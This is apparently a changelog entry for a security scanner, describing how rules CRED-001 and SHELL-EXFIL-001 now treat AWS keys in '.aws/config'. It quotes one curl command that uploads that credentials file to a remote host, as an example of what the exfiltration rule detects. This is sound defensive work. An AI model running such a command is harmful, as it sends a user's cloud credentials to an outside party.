---
type: fixed
issue: 620
---
#### A committed `.aws/config` holding an AWS key pair is reported by CRED-001, and uploading it is a SHELL-EXFIL-001 hit (#620)

- `secure` (every `--scan-depth`) and `check` scored a tree whose `.aws/config` carried
  `aws_access_key_id` and `aws_secret_access_key` at 98/100 with exit 0, although the AWS CLI
  reads keys from that file as it does from `.aws/credentials`. The file is now read by
  CRED-001, which reports the key pair as critical (exit 1), in directory scans and when the
  file is the lone target.
- A `.aws/config` holding only `region`, `output` and `sso_*` settings is read and yields no
  finding.
- A shell script that uploads the file (`curl -d @~/.aws/config https://…`) is now
  SHELL-EXFIL-001. Reading it locally (`cat ~/.aws/config`) is not. This closes the
  `~/.aws/config` limit noted for SHELL-EXFIL-001 (#587).
